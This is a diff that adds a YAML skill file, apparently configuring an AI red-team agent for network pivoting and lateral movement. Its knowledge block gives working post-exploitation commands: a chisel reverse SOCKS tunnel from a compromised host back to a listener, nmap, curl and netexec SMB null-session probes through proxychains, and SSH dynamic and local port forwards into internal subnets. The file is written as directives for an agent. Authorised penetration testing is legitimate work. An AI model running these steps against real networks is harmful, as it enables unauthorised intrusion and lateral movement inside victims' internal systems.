@@ -1,0 +1,60 @@
+schema_version: 1
+version: 3.0.0
+name: network-pivoting
+description: Senior network pivoting, SOCKS5 tunneling, SSH port forwarding, and multi-tier routing across internal subnets with chisel and proxychains.
+triggers:
+  - pivot
+  - pivoting
+  - tunnel
+  - tunneling
+  - socks
+  - socks5
+  - proxychains
+  - chisel
+  - ligolo
+  - port forward
+  - lateral movement
+tools:
+  - curl
+knowledge: |
+  Execute network pivoting and lateral traffic routing across dual-homed compromised hosts with senior red-team stealth and reliability.
+
+  1. PIVOTING ARCHITECTURE & DUAL-HOMED RECONNAISSANCE:
+     When a compromised host possesses multiple network interfaces (e.g., eth0 external, eth1 internal subnet 10.10.x.x):
+     - Identify internal subnets and routing tables on the compromised machine:
+       `ip route` or `netstat -rn` or `cat /proc/net/arp`
+     - Discover active adjacent internal hosts via ARP scanning or ping sweeps from the foothold.
+
+  2. REVERSE SOCKS5 TUNNELING VIA CHISEL:
+     Chisel traverses restrictive egress firewalls over standard HTTP/WebSocket connections:
+     - Step 1: Start Chisel server on the Kali sandbox listener:
+       `chisel server -p 8000 --reverse`
+     - Step 2: Connect from the compromised internal foothold back to sandbox:
+       `./chisel client <sandbox_ip>:8000 R:socks`
+     - Result: Exposes a local SOCKS5 proxy on `127.0.0.1:1080` in the sandbox.
+
+  3. PROXYCHAINS EXECUTION DISCIPLINE (The TCP-Only Law):
+     SOCKS proxies transport application-layer TCP streams only — raw ICMP echo (ping) and raw SYN packets (`-sS`) fail silently over SOCKS.
+     - Mandate for Nmap through Proxychains:
+       ALWAYS pass `-sT -Pn -n` to force full TCP connections and disable ping/DNS lookups:
+       `proxychains4 -q nmap -sT -Pn -n -p 80,443,445,8080 <internal_ip>`
+     - Web & Service Interaction:
+       `proxychains4 -q curl -s http://<internal_ip>/`
+       `proxychains4 -q netexec smb <internal_ip> -u '' -p ''`
+
+  4. SSH DYNAMIC & LOCAL PORT FORWARDING:
+     When SSH credentials exist on the pivot host:
+     - Dynamic Port Forward (SOCKS5 Proxy):
+       `ssh -D 1080 -q -C -N -f user@<pivot_ip>`
+     - Direct Service Mapping (Local Port Forward):
+       Forward a remote unreachable web service (e.g. 10.10.10.50:8080) directly to local sandbox port 8888:
+       `ssh -L 8888:10.10.10.50:8080 -q -N -f user@<pivot_ip>`
+       Now interact directly without proxychains: `curl http://127.0.0.1:8888`.
+
+  5. LATERAL DISCOVERY LOCK:
+     - Document intermediate jump hosts, established tunnel ports, and discovered internal assets as verified infrastructure.
+references:
+  - persona:network-pivoting-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/network-pivoting.yaml
